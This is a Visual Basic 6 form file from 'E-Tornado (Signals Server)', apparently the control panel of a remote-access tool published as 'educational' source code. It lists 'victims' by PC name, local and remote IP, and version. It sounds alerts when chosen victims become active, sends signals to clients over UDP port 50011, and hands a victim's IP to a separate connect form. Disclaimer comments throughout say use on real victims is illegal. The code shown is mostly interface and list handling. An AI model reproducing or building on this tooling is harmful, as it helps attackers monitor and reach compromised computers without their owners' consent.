VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{3B7C8863-D78F-101B-B9B5-04021C009402}#1.2#0"; "RICHTX32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00E0E0E0&
   Caption         =   "E-Tornado (Signals Server) "
   ClientHeight    =   10155
   ClientLeft      =   60
   ClientTop       =   1.08795e5
   ClientWidth     =   13275
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   10155
   ScaleWidth      =   13275
   StartUpPosition =   2  'CenterScreen
   Begin Project1.lvButtons_H lvButtons_H1 
      Height          =   375
      Left            =   11400
      TabIndex        =   21
      ToolTipText     =   "Chenge notification server settings"
      Top             =   3120
      Width           =   1695
      _ExtentX        =   2990
      _ExtentY        =   661
      Caption         =   "Server Settings"
      CapAlign        =   2
      BackStyle       =   2
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Times New Roman"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      cGradient       =   0
      Mode            =   0
      Value           =   0   'False
      cBack           =   -2147483633
   End
   Begin VB.Frame Frame7 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Operation"
      ForeColor       =   &H80000008&
      Height          =   2295
      Left            =   6120
      TabIndex        =   12
      Top             =   3600
      Width           =   7095
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         Height          =   975
         Left            =   840
         TabIndex        =   19
         ToolTipText     =   "Signal to send"
         Top             =   600
         Width           =   6015
      End
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         Height          =   285
         Left            =   840
         TabIndex        =   18
         ToolTipText     =   "Client ip information"
         Top             =   240
         Width           =   6015
      End
      Begin Project1.lvButtons_H lvButtons_H2 
         Height          =   375
         Left            =   5760
         TabIndex        =   15
         ToolTipText     =   "Send the signal to the client"
         Top             =   1680
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   661
         Caption         =   "Send"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.PictureBox Picture1 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         ForeColor       =   &H80000008&
         Height          =   135
         Left            =   840
         ScaleHeight     =   105
         ScaleWidth      =   4785
         TabIndex        =   13
         Top             =   1680
         Width           =   4815
      End
      Begin MSComctlLib.ProgressBar ProgressBar1 
         Height          =   135
         Left            =   840
         TabIndex        =   14
         Top             =   1920
         Width           =   4815
         _ExtentX        =   8493
         _ExtentY        =   238
         _Version        =   393216
         Appearance      =   0
         Max             =   15
      End
      Begin VB.Label Label2 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Signal"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   17
         Top             =   600
         Width           =   615
      End
      Begin VB.Label Label1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Client ip"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   240
         Width           =   615
      End
   End
   Begin VB.Frame Frame6 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Live log"
      ForeColor       =   &H80000008&
      Height          =   1935
      Left            =   0
      TabIndex        =   10
      Top             =   8160
      Width           =   13215
      Begin RichTextLib.RichTextBox RichTextBox1 
         Height          =   1575
         Left            =   120
         TabIndex        =   11
         ToolTipText     =   "Log window"
         Top             =   240
         Width           =   12975
         _ExtentX        =   22886
         _ExtentY        =   2778
         _Version        =   393217
         Enabled         =   -1  'True
         ReadOnly        =   -1  'True
         ScrollBars      =   2
         Appearance      =   0
         TextRTF         =   $"Form1.frx":08CA
      End
   End
   Begin VB.Frame Frame5 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Clients"
      ForeColor       =   &H80000008&
      Height          =   2055
      Left            =   0
      TabIndex        =   7
      Top             =   6000
      Width           =   13215
      Begin MSComctlLib.ListView lstWin2 
         Height          =   1380
         Left            =   120
         TabIndex        =   8
         ToolTipText     =   "Client list"
         Top             =   240
         Width           =   12855
         _ExtentX        =   22675
         _ExtentY        =   2434
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   0   'False
         HideSelection   =   0   'False
         Checkboxes      =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList12"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   0
      End
      Begin VB.Label Label5 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   1680
         Width           =   3255
      End
   End
   Begin VB.Frame Frame4 
      Caption         =   "controls"
      Height          =   1815
      Left            =   8280
      TabIndex        =   6
      Top             =   600
      Visible         =   0   'False
      Width           =   2415
      Begin VB.Timer longerupdater30 
         Interval        =   30000
         Left            =   1080
         Top             =   240
      End
      Begin Project1.ctxSysTray ctxSysTray1 
         Left            =   1200
         Top             =   1440
         _ExtentX        =   450
         _ExtentY        =   450
         TrayIcon        =   "Form1.frx":094C
      End
      Begin VB.TextBox Text7 
         Height          =   285
         Left            =   1680
         TabIndex        =   20
         Text            =   "0"
         Top             =   1320
         Visible         =   0   'False
         Width           =   615
      End
      Begin VB.Timer Timer2 
         Enabled         =   0   'False
         Interval        =   3000
         Left            =   1560
         Top             =   240
      End
      Begin VB.Timer updater 
         Interval        =   1000
         Left            =   120
         Top             =   240
      End
      Begin VB.Timer soundtimer 
         Enabled         =   0   'False
         Interval        =   30000
         Left            =   600
         Top             =   240
      End
      Begin MSComctlLib.ImageList imglstListImages 
         Left            =   120
         Top             =   720
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   -2147483643
         ImageWidth      =   10
         ImageHeight     =   9
         MaskColor       =   255
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   2
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":1226
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "Form1.frx":1282
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSWinsockLib.Winsock Winsock4 
         Left            =   600
         Top             =   1320
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock2 
         Left            =   1200
         Top             =   840
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   720
         Top             =   840
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock3 
         Left            =   120
         Top             =   1320
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Filter"
      ForeColor       =   &H80000008&
      Height          =   2295
      Left            =   0
      TabIndex        =   2
      Top             =   3600
      Width           =   6015
      Begin MSComctlLib.ListView listview1 
         Height          =   1620
         Left            =   120
         TabIndex        =   3
         ToolTipText     =   "Filter list"
         Top             =   240
         Width           =   5775
         _ExtentX        =   10186
         _ExtentY        =   2858
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   0   'False
         HideSelection   =   0   'False
         Checkboxes      =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList12"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   0
      End
      Begin VB.Label Label3 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1920
         Width           =   3255
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Victims Information"
      ForeColor       =   &H80000008&
      Height          =   3615
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   13215
      Begin Project1.lvButtons_H lvButtons_H3 
         Height          =   375
         Left            =   9240
         TabIndex        =   22
         Top             =   3120
         Width           =   2055
         _ExtentX        =   3625
         _ExtentY        =   661
         Caption         =   "Old Version Victims"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin MSComctlLib.ListView lstWin 
         Height          =   2820
         Left            =   120
         TabIndex        =   1
         ToolTipText     =   "Victim list"
         Top             =   240
         Width           =   12975
         _ExtentX        =   22886
         _ExtentY        =   4974
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   0   'False
         HideSelection   =   0   'False
         Checkboxes      =   -1  'True
         _Version        =   393217
         SmallIcons      =   "ImageList12"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   0
      End
      Begin VB.Label Label4 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Total: 0"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   3120
         Width           =   3615
      End
   End
   Begin VB.Menu filterlist 
      Caption         =   "filter"
      Visible         =   0   'False
      Begin VB.Menu addtriger 
         Caption         =   "Add Triger"
      End
      Begin VB.Menu delettriger 
         Caption         =   "Delete Triger"
      End
      Begin VB.Menu selectall 
         Caption         =   "Select All"
      End
      Begin VB.Menu deselectall 
         Caption         =   "Deselect All"
      End
      Begin VB.Menu Deleteall 
         Caption         =   "Delete All"
      End
      Begin VB.Menu disablesound 
         Caption         =   "Change Notify"
      End
      Begin VB.Menu changetriger 
         Caption         =   "Change Triger"
      End
      Begin VB.Menu changecomment 
         Caption         =   "Change Comment"
      End
      Begin VB.Menu changealtnc 
         Caption         =   "Change Notify,Triger and Comment "
      End
      Begin VB.Menu savelist 
         Caption         =   "Save List"
      End
      Begin VB.Menu stopsound 
         Caption         =   "Stop sound"
      End
   End
   Begin VB.Menu mainlist2 
      Caption         =   "mainlist"
      Visible         =   0   'False
      Begin VB.Menu connecttoit 
         Caption         =   "Connect"
      End
      Begin VB.Menu copysignal 
         Caption         =   "Copy signal"
      End
      Begin VB.Menu copylocalip 
         Caption         =   "Copy local ip"
      End
      Begin VB.Menu copyremoteip 
         Caption         =   "Copy remote ip"
      End
      Begin VB.Menu selectall2 
         Caption         =   "Select All"
      End
      Begin VB.Menu deselectall2 
         Caption         =   "Deselect all"
      End
      Begin VB.Menu delete2 
         Caption         =   "Delete Selected"
      End
      Begin VB.Menu deleteall2 
         Caption         =   "Delete All"
      End
   End
   Begin VB.Menu clientlist 
      Caption         =   "clientlist"
      Visible         =   0   'False
      Begin VB.Menu selectall3 
         Caption         =   "Select All"
      End
      Begin VB.Menu deselectall3 
         Caption         =   "Deselect All"
      End
      Begin VB.Menu deleteselected3 
         Caption         =   "Delete Selected"
      End
      Begin VB.Menu Deleteall3 
         Caption         =   "Delete All"
      End
      Begin VB.Menu addip3 
         Caption         =   "Add ip"
      End
      Begin VB.Menu modifyip3 
         Caption         =   "Modify ip"
      End
   End
   Begin VB.Menu reachtext 
      Caption         =   "reachtext1"
      Visible         =   0   'False
      Begin VB.Menu clear4 
         Caption         =   "Clear"
      End
      Begin VB.Menu save4 
         Caption         =   "Save"
      End
      Begin VB.Menu cleanlogfile 
         Caption         =   "Clean log file"
      End
   End
   Begin VB.Menu listbox1 
      Caption         =   "list1box"
      Visible         =   0   'False
      Begin VB.Menu clearlist1 
         Caption         =   "Clear"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

Option Explicit


'for system info like ram
Private objSysInfo As New cSystemInfo

'for spliting string
Public striN

'for listview sub item
Dim lItem As ListItem

'for listview sorting
Dim LVXS As New uSc_ListView_Xtended_Sort

Dim theversion As String



'add ip
Private Sub addip3_Click()
    
    'add triger to filter
    Dim trigercode, comment, thesoundc, thename As String
    trigercode = InputBox("Please enter the client name", "Input")
    comment = InputBox("Please enter the ip address", "Input")
      
      
      
            
    thename = trigercode
             
    'remove duplicates
    Dim xcounter As Long
              
        For xcounter = 1 To lstWin2.ListItems.Count
            On Error Resume Next
            If lstWin2.ListItems.Item(xcounter).Text = thename Then
                lstWin2.ListItems.Remove (xcounter)
            End If
        Next xcounter
      
         

    Set lItem = lstWin2.ListItems.Add(, , trigercode, , 0)
       lItem.ListSubItems.Add , , comment
       lItem.ListSubItems.Add , , Date
       lItem.ListSubItems.Add , , Time
       lItem.ListSubItems.Add , , "Passive"
       
End Sub


' add triger
Private Sub addtriger_Click()
    'add triger to filter
    
    Dim trigercode, comment, thesoundc As String
    trigercode = InputBox("Please enter the triger code", "Input")
    comment = InputBox("Please enter your comment", "Input")
    
    Dim notysound As Integer
    notysound = MsgBox("Notify you if victim is active", vbYesNo)
    
    If notysound = 6 Then '6 indicates a YES
        thesoundc = "yes"
    Else
        thesoundc = "no"
    End If
    
    Set lItem = listview1.ListItems.Add(, , trigercode, , 0)
       lItem.ListSubItems.Add , , thesoundc
       lItem.ListSubItems.Add , , comment
          
       
End Sub


'modify sound notify
Private Sub changealtnc_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    Dim notysound As String
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
                Dim trigercode, comment, thesoundc As String
                trigercode = InputBox("Please enter the triger code", "Input")
                listview1.ListItems.Item(1).Text = trigercode
                
                comment = InputBox("Please enter your comment", "Input")
                listview1.ListItems(i).ListSubItems(2).Text = comment
                
                notysound = MsgBox("Notify you if victim is active", vbYesNo)

                If notysound = 6 Then '6 indicates a YES
                      thesoundc = "yes"
                Else
                      thesoundc = "no"
                End If
                 
                listview1.ListItems(i).ListSubItems(1).Text = thesoundc
                           
           End If
        Next i
    End With
   
   Else
    MsgBox "Please Select an item from the filter list"
   End If
End Sub

'change commment
Private Sub changecomment_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
              Dim comment As String
              comment = InputBox("Please enter your comment", "Input")
              listview1.ListItems(i).ListSubItems(2).Text = comment
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!

'change triger
Private Sub changetriger_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    


    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
              Dim trigercode, comment, thesoundc As String
              trigercode = InputBox("Please enter the triger code", "Input")
              listview1.ListItems.Item(1).Text = trigercode
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub







Private Sub cleanlogfile_Click()
   Open Form2.Text3.Text & "\logs.txt" For Output As #1
        Print #1, "Cleaned at " & Date
   Close #1
End Sub

Private Sub clear4_Click()
    RichTextBox1.Text = ""
End Sub

Private Sub clearlist1_Click()
    Form3.List1.Clear
    Form3.Label6.Caption = "Total: " & Form3.List1.ListCount
End Sub

Private Sub Command1_Click()



End Sub

Private Sub connecttoit_Click()
    Form11.victimip.Text = "temp"
    Form11.victimip.Text = lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(3).Text
End Sub

Private Sub copylocalip_Click()
    Clipboard.Clear
    Clipboard.SetText lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(2).Text
End Sub

Private Sub copyremoteip_Click()
    Clipboard.Clear
    Clipboard.SetText lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(3).Text

End Sub

Private Sub copysignal_Click()
    Clipboard.Clear
    Clipboard.SetText lstWin.ListItems(lstWin.SelectedItem.Index).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(1).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(2).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(3).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(4).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(5).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(6).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(7).Text
End Sub


Private Sub ctxSysTray1_DblClick(Button As Integer)
Form1.Show
Me.WindowState = 0
End Sub

Private Sub ctxSysTray1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)

Form1.Show
Me.WindowState = 0
End Sub

Private Sub ctxSysTray1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Me.Show

Me.WindowState = 0
End Sub

Private Sub delete2_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To lstWin.ListItems.Count
        If lstWin.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    


    With lstWin
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                .ListItems.Remove (i)
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub deleteall_Click()
    
    listview1.ListItems.Clear
    
End Sub

Private Sub deleteall2_Click()
    lstWin.ListItems.Clear
End Sub

Private Sub Deleteall3_Click()
    lstWin2.ListItems.Clear
End Sub

Private Sub deleteselected3_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To lstWin2.ListItems.Count
        If lstWin2.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With lstWin2
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                .ListItems.Remove (i)
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub delettriger_Click()

    Dim isselected As Boolean
    Dim xcounter As Long
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then

    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                .ListItems.Remove (i)
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub

Private Sub deselectall_Click()
    Dim i As Long
    With listview1
       For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = True Then
                .ListItems.Item(i).Checked = False
            End If
        Next i
    End With
End Sub

Private Sub deselectall2_Click()
 Dim i As Long
    With lstWin
       For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = True Then
                .ListItems.Item(i).Checked = False
            End If
        Next i
    End With
End Sub

Private Sub deselectall3_Click()
 Dim i As Long
    With lstWin2
       For i = .ListItems.Count To 1 Step -1
            If .ListItems(i).Checked = True Then
                .ListItems.Item(i).Checked = False
            End If
        Next i
    End With
End Sub


Private Sub disablesound_Click()
    Dim isselected As Boolean
    Dim xcounter As Long
    Dim thesoundc As String
    
    For xcounter = 1 To listview1.ListItems.Count
        If listview1.ListItems.Item(xcounter).Checked = True Then
            isselected = True
        End If
    Next xcounter

    If (isselected) Then
    
    Dim i As Integer
    
    With listview1
      

        For i = .ListItems.Count To 1 Step -1


            If .ListItems(i).Checked Then
                
               Dim notysound As Integer
               notysound = MsgBox("Notify you if victim is active", vbYesNo)

                If notysound = 6 Then '6 indicates a YES
                    thesoundc = "yes"
                Else
                    thesoundc = "no"
                End If
                 
                listview1.ListItems(i).ListSubItems(1).Text = thesoundc
                 
            End If
        Next i
    End With
   Else
    MsgBox "Please Select an item from the filter list"

   End If
End Sub




'logger
Public Sub logit(thetext As String)
    RichTextBox1.Text = RichTextBox1.Text & "--> " & Time & " " & Date & "      " & thetext & vbCrLf & vbCrLf
    RichTextBox1.SelStart = Len(RichTextBox1.Text)
End Sub

Private Sub Form_Load()

    logit ("Loading server")
    
    'for client list
    lstWin2.ColumnHeaders.Add , , "Name", lstWin.Width / 8
    lstWin2.ColumnHeaders.Add , , "ip", lstWin.Width / 8
    lstWin2.ColumnHeaders.Add , , "Date", lstWin.Width / 8
    lstWin2.ColumnHeaders.Add , , "Time", lstWin.Width / 8
    lstWin2.ColumnHeaders.Add , , "Status / Comments", lstWin.Width / 8 + 730
    lstWin2.ColumnHeaders.Add , , "", 10
    
    
    
    'for list view split
    lstWin.ColumnHeaders.Add , , "Pc Name", lstWin.Width / 8 + 300
    
    lstWin.ColumnHeaders.Add , , "Host", lstWin.Width / 8
    
    lstWin.ColumnHeaders.Add , , "Local ip", lstWin.Width / 8 + 150
    
    lstWin.ColumnHeaders.Add , , "Remote ip", lstWin.Width / 8 + 150
    
    lstWin.ColumnHeaders.Add , , "Server Version", lstWin.Width / 8 - 300
    
    lstWin.ColumnHeaders.Add , , "Given Code", lstWin.Width / 8 - 200
    
    lstWin.ColumnHeaders.Add , , "Date", lstWin.Width / 8 - 300
    
    lstWin.ColumnHeaders.Add , , "Time", lstWin.Width / 8 - 300
    
    lstWin.ColumnHeaders.Add , , "Filter", lstWin.Width / 8 - 1110
    
    lstWin.ColumnHeaders.Add , , "", 10
   
   
   'for listview sorting
    LVXS.SetUp lstWin

 
    

    
    'filter list
    listview1.ColumnHeaders.Add , , "Triger", lstWin.Width / 7 + 600
    listview1.ColumnHeaders.Add , , "Notify", lstWin.Width / 7 - 1000
    listview1.ColumnHeaders.Add , , "Comment", lstWin.Width / 7 + 570
    listview1.ColumnHeaders.Add , , "", 10
    
     
    logit "Getting filter list"
    
    'get filter list
    Dim theinput As String
    On Error Resume Next
    Open App.path & "/data/filter.txt" For Input As #1
         Do While Not EOF(1)
          
            Input #1, theinput
            
            If InStr(Trim(theinput), "|") > 0 Then
                striN = Split(theinput, "|")
                Set lItem = listview1.ListItems.Add(, , striN(0), , 0)
                lItem.ListSubItems.Add , , striN(1)
                lItem.ListSubItems.Add , , striN(2)
            End If
         Loop
    Close #1
    
    
    'update counters
    Label3.Caption = "Total: " & listview1.ListItems.Count
    Label4.Caption = "Total: " & lstWin.ListItems.Count
    
    
  
    


    With Winsock1
        .Protocol = sckUDPProtocol
        .LocalPort = 85
        .Bind
    End With
    With Winsock4
        .Protocol = sckUDPProtocol
        .LocalPort = 111
        .Bind
    End With
    
    With Winsock2
        .Protocol = sckUDPProtocol
        .LocalPort = 65
        .Bind
    End With
    
    Winsock3.Protocol = sckUDPProtocol
    Winsock3.RemotePort = 50011
    
    
   'set version
   
    theversion = "1.6"
    
    Me.Caption = "E-Tornado (Signals Server) Version " & theversion
    ctxSysTray1.AddIconToSystray "E-Tornado (Signals Server) Version " & theversion
    
     
End Sub



Private Sub Form_Resize()
    If (Me.WindowState = 1) Then
            
           ctxSysTray1.AddIconToSystray "E-Tornado (Signals Server) Version " & theversion
           Me.Hide
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Dim notysound As Integer
    notysound = MsgBox("Exit the program,Are you sure?", vbYesNo)

    If notysound = 6 Then '6 indicates a YES
        ctxSysTray1.RemoveIconFromSystray
        
        'save all settings
        saveall
        
        
        'Unload Form11
        ForceQuit
                        
    Else
        Cancel = 1
    End If
End Sub
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


'save all settings

Public Sub saveall()
        'save settings to registry
        SaveSetting Me.Name, "form1", "check7", Form2.Check7.Value
        SaveSetting Me.Name, "form1", "check6", Form2.Check6.Value
        SaveSetting Me.Name, "form1", "check5", Form2.Check5.Value
        SaveSetting Me.Name, "form1", "check4", Form3.Check4.Value
        SaveSetting Me.Name, "form1", "check4b", Form2.Check4.Value
        SaveSetting Me.Name, "form1", "check3", Form2.Check3.Value
        SaveSetting Me.Name, "form1", "check8", Form2.Check8.Value
        SaveSetting Me.Name, "form1", "check2", Form2.Check2.Value
        SaveSetting Me.Name, "form1", "Check1", Form2.Check1.Value
        SaveSetting Me.Name, "form1", "text11", Form2.Text11.Text
        SaveSetting Me.Name, "form1", "text3", Form2.Text3.Text
        SaveSetting Me.Name, "form1", "text4", Form2.Text4.Text
        
        
        If Form2.Check4.Value = 1 Then
           On Error GoTo patherror
            ' log it
            Open Form2.Text3.Text & "\logs.txt" For Append As #1
                Print #1, Form1.RichTextBox1.Text
            Close #1
        
        End If
        
        
        
        
        
patherror:
Form2.Text3.Text = App.path & "\data"
SaveSetting Me.Name, "form1", "text3", Form2.Text3.Text
Exit Sub

        
        
        
        
        
End Sub


'force exit
Public Sub ForceQuit()
    ExitProcess 1
End Sub



Private Sub listview1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Button = vbRightButton Then
        PopupMenu filterlist
    End If
End Sub

Private Sub longerupdater30_Timer()
        
        'save filter list
        savefilterlist
        
        'web server log
        If Form2.Check8.Value = 1 Then
           On Error GoTo patherror1
            ' log it
            Open Form2.Text4.Text & "\index.txt" For Output As #1
                Print #1, Form1.RichTextBox1.Text
            Close #1
        
        End If
        
patherror1:
       Form2.Text4.Text = "C:\apache\htdocs\etornado"
       SaveSetting Me.Name, "form1", "text4", Form2.Text4.Text
       Exit Sub
End Sub

Private Sub lstWin_Click()

    Dim temp As String
    On Error Resume Next
    temp = lstWin.ListItems(lstWin.SelectedItem.Index).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(1).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(4).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(2).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(5).Text & "|" & lstWin.ListItems(lstWin.SelectedItem.Index).ListSubItems(3).Text
    On Error Resume Next
     Text1.Text = temp
End Sub

